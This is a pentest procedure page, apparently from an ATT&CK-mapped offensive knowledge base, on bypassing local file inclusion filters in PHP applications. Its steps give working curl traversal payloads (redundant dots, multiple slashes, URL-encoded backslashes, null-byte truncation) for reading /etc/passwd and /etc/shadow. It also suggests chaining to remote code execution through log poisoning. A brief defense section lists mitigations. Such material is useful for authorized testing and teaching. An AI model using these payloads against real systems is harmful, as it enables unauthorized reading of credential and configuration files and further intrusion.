---
id: 1f9dd23e-7141-4f29-ab3d-14894e46de1b
name: Basic-LFI-Filter-Bypass-Using-Directory-Traversal
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:55:58.151008+00:00'
updated_at: '2023-04-10T20:22:19.055909+00:00'
tactics:
  - '[[tactics/Initial Access|TA0001 - Initial Access]]'
techniques:
  - >-
    [[techniques/Exploit Public-Facing Application|T1190 - Exploit Public-Facing
    Application]]
sub_techniques: []
tags:
  - '[[tags/lfi]]'
  - '[[tags/file-inclusion]]'
  - '[[tags/directory-traversal]]'
  - '[[tags/filter-bypass]]'
commands:
  - '[[commands/curl-lfi-bypass-double-dot]]'
  - '[[commands/curl-lfi-bypass-multiple-slash]]'
  - '[[commands/curl-lfi-bypass-url-encoded-backslash]]'
platforms:
  - Web
  - PHP
tools: []
validated: true
---

# Basic-LFI-Filter-Bypass-Using-Directory-Traversal

## Summary

This procedure demonstrates how to bypass basic input filters in vulnerable PHP applications to perform Local File Inclusion (LFI) attacks, allowing attackers to read sensitive files like /etc/passwd by using directory traversal payloads with variations in ../ sequences and null byte termination.

## Description

Local File Inclusion (LFI) vulnerabilities occur when a PHP application includes files based on user input without proper sanitization, enabling attackers to traverse directories and read arbitrary files. Basic filter bypasses target simplistic checks that block direct '../' usage by employing redundant dots, multiple slashes, or URL-encoded backslashes to confuse the parser. This technique is effective against legacy PHP configurations (pre-PHP 5.3) where null bytes (%00) can truncate file extensions. The procedure assumes a parameter like 'page' in the URL is vulnerable to inclusion, such as in index.php?page=userinput. Success grants access to system files, potentially revealing configuration data, passwords, or paths for further exploitation. It maps to exploiting public-facing web applications and requires no authentication, making it a common initial access vector in web pentests.

## Requirements

1. Network access to the target PHP web application (e.g., via browser or command line tool like curl).
2. Identification of a vulnerable parameter susceptible to file inclusion (e.g., through manual testing or tools like Burp Suite).
3. Basic knowledge of the target server's file structure (e.g., Linux paths like /etc/passwd).
4. A tool like curl for sending HTTP requests (available on most systems).

## Defense

- Implement strict input validation and sanitization to block directory traversal patterns (e.g., using basename() or whitelisting allowed files in PHP).
- Deploy a Web Application Firewall (WAF) to detect and block common LFI payloads, including encoded variants.
- Disable allow_url_include and register_globals in PHP configuration; use open_basedir to restrict file access.
- Enable logging for file inclusion attempts and monitor for anomalous file reads (e.g., via auditd or web server logs).

## Objectives

1. Bypass simplistic input filters designed to prevent LFI attacks.
2. Include and read sensitive server files, such as /etc/passwd or configuration files.
3. Gather information for privilege escalation or further system compromise.

## Instructions

### Step 1: Identify the Vulnerable Parameter

**Context**: First, confirm the application is vulnerable to basic LFI by testing a simple traversal payload. This step verifies if the 'page' parameter (or similar) includes files without sanitization.

Use [[commands/curl-basic-lfi-test]] to send a direct traversal request:

```bash
curl "http://example.com/index.php?page=../../../etc/passwd"
```

> This command attempts to read /etc/passwd. If the response includes file contents (e.g., root:x:0:0), the endpoint is vulnerable; otherwise, proceed to bypass attempts. Expect a 200 OK response with file data on success.

### Step 2: Attempt Double Dot Slash Bypass

**Context**: If direct '../' is filtered, use redundant dots (....//) to evade basic string replacement filters that remove single '../' instances.

Execute [[commands/curl-lfi-bypass-double-dot]]:

```bash
curl "http://example.com/index.php?page=....//....//etc/passwd"
```

> This payload normalizes to ../../etc/passwd after filter processing. Successful output displays the contents of /etc/passwd, confirming the bypass.

### Step 3: Try Multiple Slash Bypass

**Context**: Some filters mishandle multiple consecutive slashes; this step uses excessive // to break path normalization.

Run [[commands/curl-lfi-bypass-multiple-slash]]:

```bash
curl "http://example.com/index.php?page=..///////..////..//////etc/passwd"
```

> The multiple slashes confuse the directory resolver, allowing traversal. Look for /etc/passwd contents in the response to verify success.

### Step 4: Use URL-Encoded Backslash Bypass

**Context**: For filters that block forward slashes or dots, encode backslashes (%5C) to simulate Windows-style paths or evade slash-specific rules.

Invoke [[commands/curl-lfi-bypass-url-encoded-backslash]]:

```bash
curl "http://example.com/index.php?page=%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd"
```

> This encoded payload (%5C for \) bypasses filters targeting Unix paths. Success is indicated by the file contents appearing in the HTTP response body.

### Step 5: Verify and Extract Data

**Context**: Once a payload succeeds, append null byte (%00) if needed to truncate extensions (e.g., ?page=../../etc/passwd%00) and extract more files like /etc/shadow or application configs.

> Manually inspect responses for sensitive data. If LFI leads to RCE (e.g., via log poisoning), chain with further procedures.
